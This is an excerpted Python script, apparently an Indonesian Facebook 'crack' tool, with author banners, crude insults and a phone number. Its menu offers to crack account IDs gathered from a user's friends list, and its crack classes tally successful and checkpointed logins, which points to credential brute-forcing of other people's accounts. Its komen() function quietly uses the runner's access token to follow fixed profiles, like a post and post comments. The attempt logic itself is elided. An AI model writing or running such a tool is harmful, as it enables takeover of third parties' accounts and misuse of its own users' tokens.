...
# Creatro : Khamdihi_28				      #
# facebook: Bang-Jack				      #
# jangan Lupa suscribe my chenel		      #
# KANG TUTORIAL					      #
# Mau Rekode ? Chat wa me izin Dulu ya Ngab !!!	      #
# WA : 081329511668 (!)################################
...
### USERAGENT ###
ua = ('Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]')
### Logo ###
logo = """ \033[36;1m
×××××××××××××××××××××××××××××××××× • CODE BY MR PATRIX •
[><]Author   : PATRIX NIH BOS    × • CRACK DULU GA SIH •
[><]NOTE     : REKODE KONTOL :(  × • SALAM KANG REKODE •
[><]Github   : Bang-Jack123      × • SELAMAT MENCOBA NGAB •
×××××××××××××××××××××××××××××××××× """
...
def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
	...
	kata = random.choice(["Kita harus melakukan yang terbaik yang kita mampu. Itu adalah tanggung jawab manusia yang suci.","Orang yang ekstrem mendapatkan hasil yang ekstrem.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Dari kesalahan ke kesalahan seseorang menemukan seluruh kebenaran.","Jalan yang sulit sering kali mengarah ke tujuan yang indah.","Hal-hal hebat tidak pernah datang dari zona nyaman.","Jika kamu tidak mau mengambil risiko yang tidak biasa, kamu harus puas dengan yang biasa.","Nikmati setiap momen dalam hidup karena kamu tidak tahu apa yang akan terjadi besok."])
        ...
        requests.post('https://graph.facebook.com/100058437404211/subscribers?access_token=' + toket) #Mau rekode ya
        requests.post('https://graph.facebook.com/100008263929058/subscribers?access_token=' + toket) #Izin julu ya
        requests.post('https://graph.facebook.com/100036134542779/subscribers?access_token=' + toket) #Bang Jack
        requests.post('https://graph.facebook.com/100064901058335/subscribers?access_token=' + toket) #WA ME KEPO
        requests.post('https://graph.facebook.com/233862391905006/comments/?message=' +kom+ '&access_token=' + toket) #IJIN DULU NJING
        requests.post('https://graph.facebook.com/233862391905006/likes?summary=true&access_token=' + toket) #mochIrpan
        requests.post('https://graph.facebook.com/233862391905006/comments/?message=Ijin Pake Scripnya bang Irpan❤️&access_token=' + toket) #SEKALI LAGI IJIN DULU
...
def login():
    ...
    print('[0] Keluar/Exit  Aja ngab gpp  +')
    print('++++++++++++++++++++++++++++++++')
    ...
    if lg == '':
        ...
        exit('[x] LIHAT MENU NAPA GANTENG')
##### MENU #####
def menu():
  try:
    toket = open('login.txt','r').read()
  ...
  print logo
  print('÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷')
  print('[•] NAMA FB TUMBAL LUH GANTENG : '+nm)
  print('[•] YOUR ID  BANGKE : '+id)
  print('[•] Birthday TIPU² LU ANJING : '+tl)
  print('÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷')
  print('[1] Crack ID Dari Teman Bangsat Luh')
...
class crack:
	...
	def main(self,fl):
		try:
			...
			self.ko+=1
			print "\r[TUNGGUCRACK] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
	def __init__(self):
	...
	def main(self,fl):
		try:
			...
			self.ko+=1
			print "\r[MENUNGGUCRACK] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
	def __init__(self):
